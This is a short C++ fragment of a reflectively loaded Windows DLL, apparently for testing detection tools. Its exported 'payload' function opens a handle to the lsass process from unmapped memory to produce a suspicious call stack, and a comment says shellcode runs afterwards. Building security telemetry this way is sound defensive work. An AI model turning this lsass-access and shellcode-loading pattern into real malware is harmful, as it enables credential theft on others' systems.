...
// Main payload function - creates suspicious call stack then executes shellcode
extern "C" __declspec(dllexport) void VoidFunc() {
    // This will create the call stack: <unknown> -> kernelbase -> ntdll
    // because this call originates from reflectively loaded DLL (unmapped memory)

    DWORD lsassPid = GetLsassPid();
    if (lsassPid != 0) {
        // This OpenProcess call will show as coming from unmapped memory
        HANDLE hLsass = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
        if (hLsass) {
            // Just accessing lsass creates the suspicious call trace we want
            // You could do more operations here if needed
            CloseHandle(hLsass);
        }
    }

    // Small delay to let monitoring tools capture the above
    Sleep(1000);
